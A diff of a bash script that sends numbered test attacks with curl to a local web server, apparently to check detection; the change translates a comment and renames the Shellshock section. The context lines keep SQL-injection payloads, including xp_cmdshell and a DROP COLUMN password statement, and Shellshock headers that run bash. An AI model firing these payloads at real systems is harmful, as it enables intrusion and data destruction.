@@ -11,7 +11,7 @@
 URL="http://localhost:8080"
 echo "Attack start$URL"
 
-# Colori per output
+# Output colors
 GREEN="\e[32m"
 RED="\e[31m"
 RESET="\e[0m"
@@ -42,9 +42,9 @@ send_attack 13 "curl \"$URL/search?q=exec+xp_cmdshell('dir')\" -i"
 send_attack 14 "curl \"$URL/api?query=SELECT+COUNT(*)+FROM+users\" -i"
 send_attack 15 "curl -X POST $URL -d 'query=ALTER TABLE users DROP COLUMN password' -i"
 
-# =======================
-# Shellshock Attacks
-# =======================
+# ===========================
+# Command Injection Attacks
+# ===========================
 send_attack 16 "curl -A '() { :;}; echo Shellshocked' $URL -i"
 send_attack 17 "curl -H 'X-Test: () { :;}; /bin/bash -c \"id\"' $URL -i"
 send_attack 18 "curl -H 'User-Agent: () { ignored;}; echo boom' $URL -i"
